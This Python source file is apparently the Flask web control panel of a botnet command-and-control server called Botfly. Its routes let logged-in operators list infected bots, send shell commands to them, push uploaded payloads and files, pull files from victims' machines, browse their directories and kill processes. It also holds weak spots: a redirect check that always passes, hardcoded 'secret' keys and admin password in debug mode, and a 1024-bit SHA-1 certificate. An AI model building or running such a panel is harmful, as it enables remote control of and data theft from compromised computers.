from werkzeug.utils import secure_filename

from server.botnetclasses import BotNet
from server.botnetserver import BotServer
from server.serverclasses import UserManager, User
from server.flaskdb import db

import eventlet
import os
import sys
import json
import re
from OpenSSL import crypto
from urllib import parse

import flask
from flask import request
import flask_login
from flask_login import LoginManager, login_required, current_user
from flask_socketio import SocketIO
from flask_mail import Message, Mail
from itsdangerous import URLSafeTimedSerializer

eventlet.monkey_patch()

''' See accompanying README for TODOs.

 To run: python server.py'''

DEBUG = True
HOSTNAME = 'botfly.me'
BASEDIR = os.path.abspath(os.path.dirname(__file__))
UPLOAD_FOLDER = 'payloads/'
DOWNLOAD_FOLDER = 'static/downloads/'

# Set this variable to "threading", "eventlet" or "gevent" to test the
# different async modes, or leave it set to None for the application to choose
# the best option based on installed packages.
async_mode = None

app = flask.Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['SECRET_KEY'] = 'secret' if DEBUG else os.environ['SECRET_KEY']
app.config['SECURITY_PASSWORD_SALT'] = 'secret' if DEBUG else os.environ['SECRET_SALT']

DB_LOC = 'test.db'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(BASEDIR, DB_LOC)
socketio = SocketIO(app, async_mode=async_mode)
db.init_app(app)

mail = Mail()
mail.init_app(app)

thread = None


# DB stuff


@app.before_first_request
def recreate_test_databases(engine=None, session=None):
    db.create_all()
    if not User.query.filter_by(uname='admin').first():
        UserManager.create_user('admin', 'fake@email.com', 'secret' if DEBUG else os.environ['ADMIN_PASS'])
    botnet.checkDB()

# Login stuff
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = "login"


@login_manager.user_loader
def load_user(user_id):
    return UserManager.get(user_id)


@app.route('/login', methods=['GET', 'POST'])
def login():
    # Here we use a class of some kind to represent and validate our
    # client-side form data. For example, WTForms is a library that will
    # handle this for us, and we use a custom LoginForm to validate.
    errs = []
    if request.method == 'POST':
        uname = request.form.get('username')
        passwd = request.form.get('password')

        if UserManager.validate(uname, passwd):
            user = UserManager.getbyname(uname)
            flask_login.login_user(user)

            flask.flash('Logged in successfully.')

            nexturl = flask.request.args.get('next')
            # is_safe_url should check if the url is safe for redirects.
            # See http://flask.pocoo.org/snippets/62/ for an example.
            if not is_safe_url(nexturl):
                return flask.abort(400)
            return flask.redirect(nexturl or flask.url_for('index'))
        else:
            errs.append("Invalid login")
    return flask.render_template('login.html', errors=errs)


@app.route("/logout")
@login_required
def logout():
    flask_login.logout_user()
    return flask.redirect(flask.url_for('login'))


@app.route("/profile", methods=['GET', 'POST'])
@login_required
def change_password():
    errs = []
    if request.method == 'POST':
        # Change password (redirect on success)
        passwd1 = request.form.get('password1')
        passwd2 = request.form.get('password2')
        if passwd1 == passwd2:
            UserManager.change_password(current_user.uname, passwd1)
            flask.flash("Success!")
            return flask.redirect(flask.url_for('index'))
        else:
            errs.append("Passwords do not match")

    return flask.render_template('profile.html', username=current_user.uname, errors=errs)


@app.route("/invite", methods=['GET', 'POST'])
@login_required
def invite():
    error = None
    manual_mail = None
    if request.method == 'POST':
        subject = 'Botfly Invitation'
        email_addr = request.form.get('email')
        email_message = request.form.get('message')
        if valid_email(email_addr):
            link = make_link(email_addr)
            email_message = parse.quote_plus(email_message + '\n' + link)
            try:
                msg = Message(subject=subject, recipients=[email_addr], body=email_message)
                mail.send(msg)
                flask.flash('Message sent!')
                return flask.redirect(flask.url_for('index'))
            except Exception as e:
                print(e)
                manual_mail = {'addr': email_addr, 'subject': subject, 'body': email_message}
    return flask.render_template('invite.html', error=error, manual_mail=manual_mail)


@app.route("/register", methods=['GET', 'POST'])
def register():
    if request.method == 'GET' and 'token' in request.args:
        token = request.args.get('token')
        emailaddr = confirm_token(token)
        if emailaddr:
            return flask.render_template('register.html', default_email=emailaddr)
        else:
            flask.flash("Invalid token")
    elif request.method == 'POST':
        uname = request.form.get('username')
        emailaddr = request.form.get('email')
        if User.query.filter_by(uname=uname).first():
            return flask.render_template('register.html', default_email=emailaddr, error='Username already taken')
        if not valid_email(emailaddr):
            return flask.render_template('register.html', default_email=emailaddr, error='Invalid email')
        passwd1 = request.form.get('password1')
        passwd2 = request.form.get('password2')
        if passwd1 == passwd2:
            UserManager.create_user(uname, emailaddr, passwd1)
            flask.flash("Account creation success!")
            return flask.redirect(flask.url_for('login'))
        else:
            return flask.render_template('register.html', default_email=emailaddr, error='Passwords do not match')
    else:
        flask.flash("No token specified")
    return flask.redirect(flask.url_for('login'))


# Research more
def is_safe_url(nexturl):
    return True


def valid_email(emailaddr):
    return re.match(r'[^@]+@[^@]+\.[^@]+', emailaddr)


def make_link(emailaddr):
    serializer = URLSafeTimedSerializer(app.config['SECRET_KEY'])
    token = serializer.dumps(emailaddr, salt=app.config['SECURITY_PASSWORD_SALT'])
    return flask.url_for('register', _external=True, token=token)


def confirm_token(token):
    serializer = URLSafeTimedSerializer(app.config['SECRET_KEY'])
    try:
        email = serializer.loads(token, salt=app.config['SECURITY_PASSWORD_SALT'])
        return email
    except Exception:
        return False


# Done with login stuff


@app.route("/bots", methods=['GET'])
@login_required
def get_bots():
    if 'bot' in request.args:
        botstr = json.dumps(botnet.getConnectionDetails(request.args.get('bot')))
        return flask.Response(botstr, status=200, mimetype='application/json')
    else:
        botstr = json.dumps(botnet.getConnectionDetails())
        return flask.Response(botstr, status=200, mimetype='application/json')


@app.route('/kill', methods=['POST', 'GET'])
@login_required
def kill_proc():
    if 'bot' in request.cookies:
        botnet.sendKillProc(request.cookies.get('bot'))
        return json.dumps({"success": True})
    return json.dumps({"success": False})


@app.route('/clear', methods=['POST', 'GET'])
@login_required
def clear_log():
    if 'bot' in request.cookies:
        botnet.clearLog(request.cookies.get('bot'))
        return json.dumps({"success": True})
    return json.dumps({"success": False})


@app.route('/uploader', methods=['POST'])
@login_required
def upload_file():
    f = request.files['file']
    # Starts forwarding file to client on separate thread, never saved locally (at least in non-temp file)
    if 'bot' in request.cookies:
        botnet.sendFile(request.cookies.get('bot'), f.filename, f)
        return json.dumps({"success": True})
    return json.dumps({"success": False})


@app.route('/downloader', methods=['GET', 'POST', 'DELETE'])
@login_required
def download_file():
    """
    POST: make the client start sending file to server
    GET:  get json list of all files currently on server
          if query parameter "file" specified then instead download
          that file from server
    """
    if request.method == 'POST':
        filename = request.form.get('file')
        if 'bot' in request.form:
            botnet.startFileDownload(request.form.get('bot'), filename)
        elif 'bot' in request.cookies:
            botnet.startFileDownload(request.cookies.get('bot'), filename)
        else:
            return "No bot selected", 404
        return "done"
    elif request.method == 'GET':
        if 'file' in request.args:
            if 'bot' in request.args:
                user = request.args.get('bot')
            else:
                user = request.cookies.get('bot')
            filename = request.args.get('file')

            real_filename = botnet.getFileName(user, filename)
            if real_filename and DOWNLOAD_FOLDER in real_filename:
                sub_filename = real_filename[real_filename.index('static/')+len('static/'):]
                return flask.redirect(flask.url_for('static',filename=sub_filename))
            elif real_filename:
                return flask.send_file(real_filename, attachment_filename=os.path.basename(filename))
            else:
                return "File not found", 404
        else:
            filestr = json.dumps(botnet.getDownloadFiles())
            return flask.Response(filestr, status=200, mimetype='application/json')
    elif request.method == 'DELETE':
        if 'file' in request.args:
            if 'bot' in request.args:
                user = request.args.get('bot')
            else:
                user = request.cookies.get('bot')
            filename = request.args.get('file')

            if botnet.deleteFile(user, filename):
                return "done"
            else:
                return "File not found", 404
        else:
            return "No file selected", 404


@app.route('/payload', methods=['GET', 'POST', 'DELETE'])
@login_required
def payload_launch():
    if request.method == 'POST':
        if 'payload' in request.form:
            payload_name = request.form.get('payload')
            if 'bot' in request.form:
                botnet.sendPayload(request.form.get('bot'), payload_name, request.form.to_dict())
            elif 'bot' in request.cookies:
                botnet.sendPayload(request.cookies.get('bot'), payload_name, request.form.to_dict())
            else:
                return "No bot selected", 404
            return "done"
        elif 'file' in request.files:
            f = request.files['file']
            filename = secure_filename(f.filename)
            location = os.path.join(BASEDIR, app.config['UPLOAD_FOLDER'], filename)
            f.save(location)
            botnet.payloadmanager.loadPayloads()
            return json.dumps({"success": True})
        else:
            return "No payload specified", 404

    elif request.method == 'GET':
        payloadstr = json.dumps(botnet.getPayloads())
        return flask.Response(payloadstr, status=200, mimetype='application/json')

    elif request.method == 'DELETE':
        if 'payload' in request.form:
            payload_name = request.form.get('payload')
            if botnet.payloadmanager.deletePayload(payload_name):
                return json.dumps({"success": True})
            else:
                return json.dumps({"success": False})


@app.route('/ls', methods=['GET', 'POST'])
@login_required
def list_dir():
    if request.method == 'POST' and 'file' in request.form:
        filename = request.form.get('file')
    else:
        filename = '.'
    if 'bot' in request.form:
        botnet.requestLs(request.form.get('bot'), filename)
    elif 'bot' in request.args:
        botnet.requestLs(request.args.get('bot'), filename)
    elif 'bot' in request.cookies:
        botnet.requestLs(request.cookies.get('bot'), filename)
    else:
        return "No bot selected", 404
    return "done"


@app.route('/choose', methods=['POST'])
@login_required
def setbot():
    resp = flask.Response("done")
    if 'bot' in request.form:
        resp.set_cookie('bot', request.form.get('bot'))
    return resp


@app.route('/log', methods=['POST'])
@login_required
def resend_log():
    if request.method == 'POST':
        connected = ''
        if 'bot' in request.form:
            connected = request.form.get('bot')
        elif 'bot' in request.cookies:
            connected = request.cookies.get('bot')
        filestr = json.dumps(botnet.getLog(connected))
        return flask.Response(filestr, status=200, mimetype='application/json')
    return "done"


@app.route('/finder')
@login_required
def finder():
    return flask.render_template('finder.html', async_mode=socketio.async_mode, bot_list=botnet.getOnlineConnections())


@app.route('/index')
@app.route('/')
@login_required
def index():
    resp = flask.make_response(flask.render_template('index.html',
                                                     async_mode=socketio.async_mode,
                                                     bot_list=botnet.getOnlineConnections(),
                                                     payload_list=botnet.getPayloadNames()))
    if 'bot' in request.cookies:
        bot = request.cookies.get('bot')
        if not botnet.hasConnection(bot):
            resp.set_cookie('bot', '', expires=0)

    if request.method == 'POST':
        resp.set_cookie('bot', request.form.get('bot'))
    return resp


@socketio.on('send_command', namespace='/bot')
def send_command(cmd):
    if 'bot' in request.cookies:
        botnet.sendStdin(request.cookies.get('bot'), cmd['data'] + '\n')


# Crypto stuff
def create_self_signed_cert(certfile, keyfile, certargs, cert_dir="."):
    if not os.path.isdir(cert_dir):
        os.mkdir(cert_dir)
    c_f = os.path.join(cert_dir, certfile)
    k_f = os.path.join(cert_dir, keyfile)
    if not os.path.exists(c_f) or not os.path.exists(k_f):
        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, 1024)
        cert = crypto.X509()
        cert.get_subject().C = certargs["Country"]
        cert.get_subject().ST = certargs["State"]
        cert.get_subject().L = certargs["City"]
        cert.get_subject().O = certargs["Organization"]
        cert.get_subject().OU = certargs["Org. Unit"]
        cert.get_subject().CN = HOSTNAME
        cert.set_serial_number(1000)
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(315360000)
        cert.set_issuer(cert.get_subject())
        cert.set_pubkey(k)
        cert.sign(k, 'sha1')
        open(c_f, "wb").write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        open(k_f, "wb").write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))


def main():
    global botnet
    global botserver

    USE_SSL_FLASK = False
    USE_SSL_BOTS = True

    CERT_DIR = "cert"
    CERT_FILE = "cert.pem"
    KEY_FILE = "key.pem"

    if USE_SSL_BOTS or USE_SSL_FLASK:
        create_self_signed_cert(CERT_FILE, KEY_FILE,
                                certargs=
                                {"Country": "US",
                                 "State": "NY",
                                 "City": "Ithaca",
                                 "Organization": "CHC",
                                 "Org. Unit": "Side-Projects"},
                                cert_dir=CERT_DIR)
        CERT_FILE = os.path.join(CERT_DIR, CERT_FILE)
        KEY_FILE = os.path.join(CERT_DIR, KEY_FILE)

        if (sys.version_info.major, sys.version_info.minor) >= (3, 6):
            print("[!] There is a known bug with SSL and eventlet/Python 3.6,\n" +
                  "\ttry a different python version or turn off SSL")

    botnet = BotNet(socketio, app)
    if USE_SSL_BOTS:
        botserver = BotServer(botnet, socketio, certfile=CERT_FILE, keyfile=KEY_FILE)
    else:
        botserver = BotServer(botnet, socketio)

    botnet.start()
    botserver.start()

    if USE_SSL_FLASK:
        socketio.run(app, debug=DEBUG, use_reloader=False, certfile=CERT_FILE, keyfile=KEY_FILE, port=1111, host='0.0.0.0')
    else:
        socketio.run(app, debug=DEBUG, use_reloader=False, port=1111, host='0.0.0.0')
